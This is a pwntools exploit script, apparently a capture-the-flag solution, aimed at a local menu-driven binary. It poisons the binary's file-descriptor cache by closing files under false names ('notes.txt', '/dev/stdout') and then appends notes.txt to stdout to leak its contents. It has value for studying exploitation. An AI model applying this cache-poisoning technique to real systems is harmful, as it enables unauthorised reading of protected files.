#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'main')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

io = start()


def open_file(name):
    io.sendlineafter(b'> ', b'3')  # Menu: Open market file
    io.sendlineafter(b'Enter market name to open its file: ', name.encode())
    io.recvuntil(b'Opened')  # Wait for success message

def close_file(name, fd):
    io.sendlineafter(b'> ', b'5')  # Menu: Close file
    io.sendlineafter(b'Enter file name to close: ', name.encode())
    io.sendlineafter(b'Enter file descriptor: ', str(fd).encode())
    io.recvuntil(b'Closed file.')

def append_hacked(name):
    io.sendlineafter(b'> ', b'4')  # Menu: Append hacked file
    io.sendlineafter(b'Enter hacked file name to append: ', name.encode())

# === Step 1: Open legit file to get valid FD ===
open_file("covenant_core")  # This gives fd 3 most likely

# === Step 2: Poison cache with "notes.txt" ===
close_file("notes.txt", 3)

# === Step 3: Reopen to get same FD ===
open_file("covenant_core")

# === Step 4: Poison cache with "/dev/stdout" ===
close_file("/dev/stdout", 3)

# === Step 5: Open "/dev/stdout" via fast cache ===
open_file("/dev/stdout")

# === Step 6: Append notes.txt to it ===
append_hacked("notes.txt")

# You should now see the content of notes.txt dumped to your screen

# Keep the connection open to read the data
io.interactive()

